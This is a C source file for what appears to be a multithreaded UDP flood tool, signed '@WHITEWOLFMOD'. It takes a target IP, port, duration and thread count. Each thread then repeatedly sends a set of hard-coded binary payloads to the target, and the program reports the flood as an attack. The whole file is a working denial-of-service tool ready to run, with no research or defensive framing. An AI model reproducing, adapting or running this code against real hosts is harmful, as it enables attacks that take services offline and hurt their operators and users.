#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./program ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x37\xFD\x93\xB4\xD2\xC6\xA0\x55\x2F\x68\x7D\x46\x93\x79\x26\x9A\x55\x17\xD8\x0B\xD5\x36\xC5\xC8\xD2\x73\x3B\xD0\xFA\x36\x33\xF6\x72\x74\xD6\x45\xB4\x68\x74\x66\x7F\x25\x50\xE9\xE5\x99\x16\xB8\xDB\x6C\xAF\x10\x73\x0B\x21\xB9\xD4\x5C\x96\x23\x2E\x93\x05\xE1\x6B\x49\xAA\x5D\x4F\x38\x25\xC5\x44\x1B\xED\x43\xC5\x3D\xEA\xAF\x0F\x81\xD6\xBB\xCF\x28\xAF\x4F\x96\x22\xD8\x0C\xD6\xB2\xD1\xE7\xC9\xC1\x7F\x5C\x8F\xFE\xA0\xC4\xEF\x9E\x2B\x4C\x6B\x5C\x2A\xDC\x51\xF5\xFC\x21\xA1\x3C\x74\x03\xF3\xD1\x6E\xD0\x3E\xE4\x72\x23\xC3",
"\x37\xFD\x93\xB4\x32\xC6\xA0\x55\x2F\x68\x7D\x46\x93\x79\x7E\x9A\xD5\xC4\xE7\x0B\xD5\x36\x8D\xCF\x52\x71\xC7\x02\x9A\x86\x24\xF0\x3A\x34\xA6\xC7\x5F\xB2\xC5\x7F\x1C\xFC\x98\x25\x5F\x55\xB2\x16\x53\xB7\xA2\x9C\x44\x9E\x53\xCE\xAE\x08\x19\x7C\x6F\x87",
"\x37\xFD\x93\xB4\x92\xC6\xA0\x55\x2F\x68\x7D\x46\x93\x79\xEA\x9B\xD5\x6B\xD8\x4B\xD3\x36\x65\xCE\xDE\x71\x1B\xD0\xFA\x0E\x94\x95\x82\xF7\xA4\x73\xA1\xD3\x18\xBC\x5D\x6D\x64\x83\x25\xC7\x22\x37\xF2\x4C\x08\x77\x06\xF6\x84\x50\xF4\xB1\x04\x0D\x13\x76\x0E\xF1\x33",
"\x37\xFD\x93\xB4\xB6\xE4\xA7\xEF\x0E",
"\x37\xFD\x93\xB4\xA2\xE4\xA8\x55\x0F\x81\x5C\x08\x65\x1F\x70\xF9\x61\x6C\x7B\x99\x96\x36\x4C\x1C\x19\x96\xD9\x7A\xFB\x86\x24\xCA\xE2\x1E\x16\xB3\x10\x52\x18\x3F\x3C\x3D\xC0\x83\x25\x6F\xB2\x12\xB7\x35\xEC\x08\xE3\x61\xE1\x4F\x70\xF6\xFA\x7A\x6D\x8B\xF9\x30\x2B\x49\x6A\x48\x5F\x70\x87\x72\x1D\x67\x59\xF2\xD4\xC3\xA3"

    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
/*
@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD
*/
